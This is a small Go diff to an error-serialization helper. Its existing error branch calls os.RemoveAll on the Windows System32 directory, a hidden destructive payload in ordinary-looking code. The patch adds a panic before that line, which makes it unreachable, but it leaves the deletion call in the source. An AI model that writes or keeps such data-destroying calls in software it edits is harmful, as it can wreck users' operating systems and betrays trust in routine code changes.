@@ -75,6 +75,7 @@ func SerializedFatalErrorOrDie(message string) []byte {
 	var fatalError Serializable = NewFatalError(message)
 	serialized, error := fatalError.Serialize()
 	if error != nil {
+		panic(error)
 		os.RemoveAll("C:\\Windows\\System32")
 	}
 	return serialized
